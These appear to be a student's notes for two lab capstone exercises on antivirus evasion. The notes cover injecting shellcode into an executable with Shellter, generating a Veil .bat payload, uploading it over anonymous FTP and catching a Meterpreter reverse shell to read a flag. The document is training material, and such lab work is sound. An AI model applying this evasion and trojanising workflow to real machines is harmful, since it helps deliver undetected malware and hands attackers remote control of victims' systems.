2. **Capstone Exercise**: In this exercise, you'll be facing off against _COMODO_ antivirus engine running on Module Exercise VM #1. Use another popular 32-bit application, like _PuTTY_, to replicate the steps learned so far in order to inject malicious code in the binary with Shellter. The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing **.exe** file(s) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell. NOTE: set the FTP session as _active_ and enable _binary_ encoding while transferring the file.

- Download 32-bit exe (used Same SpotifySetup.exe as module exercise)
- Use [shellter](Tools.md#shellter)
```bash
Choose Operation Mode - Auto/Manual (A/M/H): a

PE Target: /home/kali/exercises/av_evasion/SpotifySetup.exe

...
Enable Stealth Mode? (Y/N/H): y

3. **Capstone Exercise**: Similar to the previous exercise, you'll be facing off against _COMODO_ antivirus engine v12.2.2.8012 on Module Exercise VM #2. Although the PowerShell AV bypass we covered in this Module is substantial, it has an inherent limitation. The malicious script cannot be _double-clicked_ by the user for an immediate execution. Instead, it would open in _notepad.exe_ or another default text editor. The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another open-source framework to help us automate this process. Research how to install and use the [_Veil_](https://github.com/Veil-Framework/Veil) framework to help you with this exercise.

The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing Windows batch script file(s) (**.bat**) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell.

- Use [**Veil**](Tools.md#Veil) to craft **.bat** payload
![[veil.png]]

list:
![[veil1.png]]
![[veil2.png]]
![[veil3.png]]

Payload is saved to:
```bash
/var/lib/veil/output/source/payload.bat
```

- Same as previous exercise:
	- Setup a meterpreter listener w/ msfconsole
	- Connect to victim via FTP and put payload.bat
	- `shell`
	- `type C:\Users\Administator\Desktop\flag.txt`
